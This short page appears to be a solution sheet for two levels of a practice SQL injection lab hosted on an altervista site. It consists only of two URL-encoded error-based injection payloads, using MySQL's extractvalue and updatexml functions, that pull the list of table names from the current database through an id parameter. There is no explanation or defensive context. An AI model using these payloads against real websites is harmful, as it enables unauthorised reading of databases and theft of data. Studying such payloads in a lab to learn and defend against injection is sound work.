# [MAIN PAGE](http://root0x00.altervista.org/sqli/)

## XPATH LEVEL 1

```
http://root0x00.altervista.org/sqli/xpath.php?id=1%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))--+
```

## XPATH LEVEL 2
```
http://root0x00.altervista.org/sqli/xpath2.php?id=1%27%20and%20updatexml(null,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())),null)--+
```
